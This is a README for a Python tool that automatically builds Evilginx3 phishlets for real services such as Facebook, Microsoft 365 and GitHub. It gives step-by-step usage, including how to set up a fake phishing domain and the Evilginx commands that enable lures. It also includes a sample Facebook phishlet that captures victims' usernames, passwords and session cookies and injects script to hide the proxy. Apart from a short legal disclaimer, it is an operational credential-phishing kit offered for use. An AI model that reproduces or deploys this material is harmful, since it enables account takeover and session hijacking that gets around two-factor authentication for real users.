[README.md](https://github.com/user-attachments/files/29044923/README.md)
<div align="center">

```
███████╗███████╗██████╗  ██████╗      ██████╗ ██████╗ ██████╗ ███████╗██╗  ██╗
╚══███╔╝██╔════╝██╔══██╗██╔═══██╗    ██╔════╝██╔═══██╗██╔══██╗██╔════╝╚██╗██╔╝
  ███╔╝ █████╗  ██████╔╝██║   ██║    ██║     ██║   ██║██║  ██║█████╗   ╚███╔╝ 
 ███╔╝  ██╔══╝  ██╔══██╗██║   ██║    ██║     ██║   ██║██║  ██║██╔══╝   ██╔██╗ 
███████╗███████╗██║  ██║╚██████╔╝    ╚██████╗╚██████╔╝██████╔╝███████╗██╔╝ ██╗
╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝      ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝
```

# Phishlet Generator — Zero Codex Engine

**Automated Evilginx3 phishlet builder powered by real browser automation**

[![Python](https://img.shields.io/badge/Python-3.7+-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
[![Playwright](https://img.shields.io/badge/Playwright-Chromium-45ba4b?style=for-the-badge&logo=playwright&logoColor=white)](https://playwright.dev)
[![Evilginx3](https://img.shields.io/badge/Evilginx-3.x-red?style=for-the-badge)](https://github.com/kgretzky/evilginx2)
[![License](https://img.shields.io/badge/License-Educational%20Use-yellow?style=for-the-badge)](#license)

> **Developer:** Momen Abu Assi &nbsp;|&nbsp; **Project:** ZeroCodeX

</div>

---

## 📖 Overview

**Zero Codex Phishlet Generator** automates the creation of `.yaml` phishlet files for [Evilginx3](https://github.com/kgretzky/evilginx2).

Instead of manually reverse-engineering a website's login flow, this tool:

- Launches a real Chromium browser and navigates to the target site
- Logs in with your test credentials to capture live network traffic
- Automatically detects POST fields, session cookies, and auth tokens
- Handles CAPTCHA and 2FA by pausing for manual resolution
- Outputs a production-ready `.yaml` phishlet file

**Supported targets include** Facebook, LinkedIn, X/Twitter, Microsoft 365, Instagram, Spotify, OnlyFans, GitHub, Reddit, and any custom site.

---

## ✨ Key Features

| Feature | Description |
|---------|-------------|
| 🤖 **Smart Field Classification** | Automatically separates credentials, dynamic tokens, and static force values |
| 🍪 **Cookie Harvesting** | Collects and stabilises session cookies after login |
| 🔐 **CAPTCHA / 2FA Support** | Pauses indefinitely for manual challenge solving |
| 🌐 **Multi-step Login** | Handles email → next → password flows (Twitter, Microsoft) |
| 🛡️ **Anti-Detection** | Injects `js_inject` scripts to hide proxy indicators |
| 🧹 **Smart Filtering** | Removes noise domains, ad trackers, and irrelevant cookies |
| ⚡ **Auto domain mapping** | Detects required CDN and API subdomains automatically |
| 📝 **YAML Serializer** | Generates clean, valid Evilginx3-compatible YAML |

---

## 📋 Requirements

| Component | Version |
|-----------|---------|
| Python | 3.7 or higher |
| pip | Latest |
| Playwright + Chromium | Via pip |
| Evilginx3 | 3.0.0 or higher |

---

## 🛠 Installation

### 1. Clone the repository

```bash
git clone https://github.com/MomenAbuAssi/Phishlets-Build.git
cd zero-codex-phishlet-generator
```

### 2. Install Python dependencies

```bash
pip install -r requirements.txt
```

**`requirements.txt`**
```
colorama
playwright
urllib3
```

### 3. Install Playwright browser

```bash
playwright install chromium
```

### 4. Install system dependencies (Linux only)

```bash
playwright install-deps chromium
```

---

## 🚀 Usage

```bash
python phishlet_generator.py
```

The tool guides you through interactive prompts:

---

### Step-by-step walkthrough

#### 🔗 Target URL
```
[?] Target URL: https://www.facebook.com/
```
Enter the real website you want to generate a phishlet for.

#### 🌐 Fake Domain
```
[?] Fake domain (e.g. evil.com): your-domain.com
```
Your phishing domain — must be under your control and pointed to your Evilginx3 server.

#### 🏷️ Phishlet Name
```
[?] Phishlet name [facebook]:
```
Press Enter to use the auto-detected name, or type a custom one.

#### 🖥️ Headless Mode
```
[?] Headless? (y/N):
```
- `N` (recommended) — visible browser window, allows manual CAPTCHA/2FA solving
- `y` — background mode for servers (CAPTCHA cannot be solved manually)

#### 🔑 Login Page
```
[?] Login page:
  1. Auto-detect (click login button)
  2. Provide direct login URL
```
Option `2` is recommended for most sites to skip the landing page.

#### 🧑‍💻 Real Account Mode
```
[?] Have account? (y/N): y
[?] Email/username: test@example.com
[?] Password:
```
Using a real account captures live POST traffic and session cookies, producing a complete phishlet.

---

## ▶️ What Happens Automatically

```
Phase 1: Navigation     → Opens the login page
Phase 2: Login Flow     → Fills credentials, submits, waits for result
Phase 3: Form Extract   → Scans DOM for form fields and hidden tokens
Phase 4: Cookie Collect → Harvests session cookies from all subdomains
Phase 5: Stabilisation  → Waits for cookie jar to stabilise (up to 60s)
Build:   YAML Output    → Generates the phishlet file
```

### CAPTCHA / 2FA Handling

If a challenge appears, the script pauses automatically:

```
[!] CAPTCHA — solve it manually in the browser window.
[i] Script is waiting indefinitely...
[✓] CAPTCHA solved — continuing...
```

Solve the challenge in the open browser window — the script resumes on its own.

---

## 📦 Output

```
[✓] Done (✅ Real login).
[+] Building YAML...
════════════════════════════════════════════════════════════════
  ✓  PHISHLET SAVED: phishlets/facebook.yaml
════════════════════════════════════════════════════════════════
  Mode        : ✅ Real login
  Proxy hosts : 6
  Auth tokens : 9
  Force POST  : 2 entries
  Auth URLs   : 2
  Credentials : user=email  pass=pass
  Login       : www.facebook.com/login/
```

The phishlet is saved in the `phishlets/` folder (created automatically).

---

## ⚡ Evilginx3 Commands

After generating the phishlet:

```bash
phishlets load facebook
phishlets hostname facebook your-domain.com
phishlets enable facebook
lures create facebook
```

---

## 🏗️ Generated YAML Structure

```yaml
name: 'facebook'
min_ver: '3.0.0'

proxy_hosts:
  - {phish_sub: 'www', orig_sub: 'www', domain: 'facebook.com',
     session: true, is_landing: true, auto_filter: true}

sub_filters:
  - {triggers_on: 'www.facebook.com', search: 'https://www.facebook.com',
     replace: 'https://{hostname}', mimes: ['text/html', ...]}

auth_tokens:
  - domain: '.facebook.com'
    keys: ["c_user", "xs", "fr", "datr", ".*,regexp"]

credentials:
  username: {key: 'email', search: '(.*)', type: 'post'}
  password: {key: 'pass',  search: '(.*)', type: 'post'}

auth_urls:
  - '/'
  - '/home.php'

login:
  domain: 'www.facebook.com'
  path: '/login/'

force_post:
  - path: '/api/graphql/'
    search:
      - {key: '__user', search: '(.*)'}
    force:
      - {key: '__ccg', value: 'GOOD'}
    type: 'post'

js_inject:
  - trigger_domains: ['www.facebook.com']
    trigger_paths: ['/login/', '/']
    script: |
      (function() {
        Object.defineProperty(document, 'domain', {
          get: function() { return 'facebook.com'; }
        });
      })();
```

---

## 🧰 Troubleshooting

| Problem | Solution |
|---------|----------|
| `playwright` not recognised | Run `pip install playwright` then `playwright install chromium` |
| Script freezes on CAPTCHA | Solve it manually in the browser — script resumes automatically |
| Login fails immediately | Check credentials; script cannot bypass wrong passwords |
| No cookies collected | Ensure `Have account? y` and login was fully successful |
| Page loads without styling | CDN subdomains not proxied — run again with a stable connection |
| `force_post: missing force field` | Evilginx version issue — add `force: []` manually or upgrade Evilginx |
| Wrong `login.path` generated | Use option `2` and provide the direct login URL manually |

---

## 🔍 How Field Classification Works

Every POST field captured during login is automatically classified:

```
Email / Password              → search  (captured from victim)
Dynamic tokens (lsd, __s...)  → search  (captured per-session)
remember_me, LoginOptions     → force   (injected as fixed value)
debug, trace, request_id      → ignored (noise)
Values longer than 20 chars   → ignored (dynamic tokens/hashes)
```

Only 9 whitelisted keys can appear in `force`:
`remember_me`, `rememberme`, `keep_me_signed_in`, `stay_signed_in`,
`persistent`, `loginoptions`, `remembermfa`, `__ccg`, `login`

---

## 📁 Project Structure

```
zero-codex-phishlet-generator/
├── Auto-Generated__Phishlets.py   # Main script
├── requirements.txt               # Python dependencies
├── README.md                      # This file
├── .gitignore                     # Ignore phishlets output
└── phishlets/                     # Generated YAML files (auto-created)
    ├── facebook.yaml
    ├── linkedin.yaml
    └── ...
```

---

## ⚠️ Legal Disclaimer

This tool is provided **strictly for educational purposes and authorised penetration testing only**.

- You must have **explicit written permission** from the target organisation
- Unauthorised use against real users or systems is **illegal** in most jurisdictions
- The author assumes **no liability** for any misuse or damage caused

**Use responsibly. Stay ethical.**

---

## 📄 License

```
Zero Codex Engine — Phishlet Generator
Developer: Momen Abu Assi
For authorised security research and penetration testing only.
```

---

<div align="center">

**Zero Codex Engine** — Built for security researchers

*If this tool helped your research, consider giving it a ⭐*

</div>
